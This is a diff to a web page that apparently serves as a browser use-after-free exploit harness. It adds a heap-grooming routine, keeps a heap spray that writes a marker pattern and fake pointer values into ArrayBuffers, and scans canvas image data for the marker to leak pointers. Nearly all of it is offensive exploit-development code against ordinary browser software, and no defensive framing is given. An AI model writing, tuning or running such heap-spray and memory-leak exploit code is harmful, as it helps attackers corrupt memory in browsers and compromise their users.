@@ -43,7 +43,7 @@
         const status = document.getElementById('status');
         const consoleDiv = document.getElementById('console');
         let attemptCount = 0;
-        const imageDataSize = 512 * 512 * 2; // 512KB
+        const imageDataSize = 512 * 512 * 4; // 1MB
 
         function log(msg) {
             consoleDiv.append(msg + '\n');
@@ -72,13 +72,21 @@
             ctx.putImageData(imageData, 0, 0);
         }
 
+        function groomHeap() {
+            const dummy = [];
+            for (let i = 0; i < 100; i++) {
+                dummy.push(new ArrayBuffer(0x1000)); // 4KB dummy buffers
+            }
+            return dummy;
+        }
+
         function sprayHeap() {
             const arrays = [];
-            for (let i = 0; i < 200; i++) { // Reduced from 1000
+            for (let i = 0; i < 200; i++) { // Reduced
                 const buf = new ArrayBuffer(imageDataSize);
                 const view = new DataView(buf);
                 for (let j = 0; j < buf.byteLength; j += 16) {
-                    view.setUint32(j, 0x41424344, true); // ABCD pattern
+                    view.setUint32(j, 0x41424344, true); // ABCD
                     view.setUint32(j + 4, 0x12345678, true); // Fake ptr low
                     view.setUint32(j + 8, 0x87654321, true); // Fake ptr high
                     view.setUint32(j + 12, i, true); // Index
@@ -128,12 +136,12 @@
                     ranges.push(currentRange);
                 }
 
-                // Check for sprayed pattern (only if no errors)
+                // Check for sprayed pattern
                 let leak = null;
                 if (differenceCount > 0) {
                     try {
                         const currentView = new DataView(current.buffer);
-                        for (let i = 0; i < Math.min(current.buffer.byteLength - 16, 2048); i += 4) {
+                        for (let i = 0; i < Math.min(current.buffer.byteLength - 16, 1024); i += 4) {
                             if (currentView.getUint32(i, true) === 0x41424344) {
                                 const lo = currentView.getUint32(i + 4, true);
                                 const hi = currentView.getUint32(i + 8, true);
@@ -173,11 +181,15 @@
                     refView[i] = 0x46;
                 }
 
+                // Heap grooming
+                log('Grooming heap with dummy buffers...');
+                const dummy = groomHeap();
+
                 // Spray heap
-                log('Spraying heap with 500 buffers...');
+                log('Spraying heap with 200 buffers...');
                 const sprayed = sprayHeap();
 
-                // Intensive drawing
+                // Intensive drawing after spray
                 const drawInterval = setInterval(drawOnCanvas, 1);
 
                 // Check for UAF
@@ -246,7 +258,7 @@
                             log('No UAF detected');
                         }
                     }
-                }, 400); // Increased timeout
+                }, 500); // Increased timeout
             } catch (err) {
                 status.textContent = `Failed: ${err.message}`;
                 log(`Error: ${err.message}`);
